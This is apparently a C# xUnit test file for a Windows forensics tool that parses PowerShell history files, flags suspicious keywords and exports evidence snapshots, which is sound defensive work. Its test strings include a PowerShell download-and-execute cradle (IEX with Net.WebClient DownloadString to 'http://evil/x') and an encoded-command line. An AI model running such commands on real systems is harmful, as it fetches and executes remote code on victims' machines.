using System.Text.Json;
using WinDFIR.Core.Entities;
using WinDFIR.Core.Index;
using WinDFIR.Core.Snapshot;
using WinDFIR.Providers;
using WinDFIR.Providers.Parsers;
using Xunit;

namespace WinDFIR.Tests;

public class PowerShellHistoryTests
{
    [Fact]
    public void ParseHistory_SplitsLines_SkipsBlanks_AndFlagsKeywords()
    {
        const string content = "Get-Process\r\n\r\nIEX (New-Object Net.WebClient).DownloadString('http://evil/x')\npowershell -enc ZQBjAGgAbwA=\n   \nwhoami";

        var entries = PowerShellHistoryParser.ParseHistory(content);

        Assert.Equal(4, entries.Count);
        Assert.Equal("Get-Process", entries[0].Command);
        Assert.Empty(entries[0].SuspiciousKeywords);

        var iex = entries[1];
        Assert.Contains("iex", iex.SuspiciousKeywords);
        Assert.Contains("downloadstring", iex.SuspiciousKeywords);
        Assert.Contains("net.webclient", iex.SuspiciousKeywords);

        Assert.Contains("-enc", entries[2].SuspiciousKeywords);
        Assert.Equal("whoami", entries[3].Command);
        // Line numbers reflect physical position (whoami is the 6th physical line).
        Assert.Equal(6, entries[3].LineNumber);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void ParseHistory_EmptyContent_ReturnsEmpty(string? content)
    {
        Assert.Empty(PowerShellHistoryParser.ParseHistory(content));
    }

    [Fact]
    public async Task Provider_EmitsEventPerCommand_WithUserAndKeywords()
    {
        var usersRoot = Path.Combine(Path.GetTempPath(), "HostWitness_PSUsers_" + Guid.NewGuid().ToString("N"));
        var psDir = Path.Combine(usersRoot, "victim", "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine");
        Directory.CreateDirectory(psDir);
        try
        {
            await File.WriteAllTextAsync(
                Path.Combine(psDir, "ConsoleHost_history.txt"),
                "whoami\nIEX (New-Object Net.WebClient).DownloadString('http://x')\n");

            var events = new List<ActivityEvent>();
            var provider = new PowerShellHistoryProvider(usersRoot);
            provider.EventProduced += (_, e) =>
            {
                lock (events) events.Add(e);
            };

            await provider.StartAsync();
            await WaitForCountAsync(events, 2, TimeSpan.FromSeconds(5));
            await provider.StopAsync();

            Assert.Equal(2, events.Count);
            Assert.All(events, e =>
            {
                Assert.Equal("PowerShell", e.Category);
                Assert.Equal("ConsoleHostHistory", e.Action);
                Assert.Equal("victim", e.Fields["User"]);
            });
            var suspicious = events.Single(e => e.Fields.ContainsKey("SuspiciousKeywords"));
            Assert.Contains("downloadstring", suspicious.Fields["SuspiciousKeywords"].ToString());
        }
        finally
        {
            try { Directory.Delete(usersRoot, recursive: true); } catch { /* ignore */ }
        }
    }

    [Fact]
    public async Task Exporter_CopiesPowerShellHistoryOnce_NotSkipped()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "HostWitness_PSExport_" + Guid.NewGuid().ToString("N"));
        var srcDir = Path.Combine(tempDir, "src");
        Directory.CreateDirectory(srcDir);
        try
        {
            var histFile = Path.Combine(srcDir, "ConsoleHost_history.txt");
            await File.WriteAllTextAsync(histFile, "whoami\nhostname\n");

            // Two events referencing the SAME history file (as the provider would emit).
            var index = new InMemoryActivityIndex(10);
            for (var i = 0; i < 2; i++)
            {
                index.AddEvent(new ActivityEvent
                {
                    Timestamp = DateTime.UtcNow.AddTicks(i),
                    Category = "PowerShell",
                    Action = "ConsoleHostHistory",
                    Summary = "cmd",
                    Evidence = new List<EvidenceRef> { new("PowerShellHistory", histFile) }
                });
            }

            var outDir = Path.Combine(tempDir, "out");
            Directory.CreateDirectory(outDir);
            var exporter = new SnapshotExporter { UseVssSnapshots = false };
            await exporter.ExportAsync(index, outDir);

            var snapshotDir = Directory.GetDirectories(outDir, "snapshot_*").Single();
            var manifest = JsonDocument.Parse(await File.ReadAllTextAsync(Path.Combine(snapshotDir, "manifest.json")));
            var summary = manifest.RootElement.GetProperty("collectionSummary");
            // De-duped by source path: one physical copy, both references rewritten.
            Assert.Equal(1, summary.GetProperty("copiedArtifactFileCount").GetInt32());
            Assert.Equal(2, summary.GetProperty("rewrittenEvidenceReferenceCount").GetInt32());
            Assert.Equal(0, summary.GetProperty("skippedEvidenceReferenceCount").GetInt32());

            var psRaw = Path.Combine(snapshotDir, "raw", "powershell");
            Assert.True(Directory.Exists(psRaw));
            Assert.Single(Directory.GetFiles(psRaw));
        }
        finally
        {
            try { Directory.Delete(tempDir, recursive: true); } catch { /* ignore */ }
        }
    }

    private static async Task WaitForCountAsync(List<ActivityEvent> events, int target, TimeSpan timeout)
    {
        var sw = System.Diagnostics.Stopwatch.StartNew();
        while (sw.Elapsed < timeout)
        {
            lock (events)
            {
                if (events.Count >= target)
                    return;
            }
            await Task.Delay(20);
        }
    }
}
